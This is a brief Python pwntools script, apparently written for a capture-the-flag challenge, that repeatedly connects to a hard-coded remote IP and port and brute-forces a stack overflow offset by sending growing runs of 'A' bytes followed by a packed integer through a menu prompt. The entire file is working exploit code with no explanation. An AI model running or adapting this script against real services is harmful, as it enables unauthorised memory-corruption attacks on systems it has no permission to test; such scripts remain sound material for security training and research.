from pwn import *

context.log_level = 'debug'

ip, port = '134.122.104.91', 32475

payload = p32(123456)
#print(payload)

for i in range(1, 200-4+1, 1):
	s = b'A'*i + payload
	io = remote(ip, port)
	io.recvuntil(b'Selection:')
	io.sendline(b'1')
	io.recvuntil(b'Statement (max 200 characters):')
	io.sendline(s)
	io.recvuntil(b'Selection:')
	io.sendline(b'2')
	io.close()

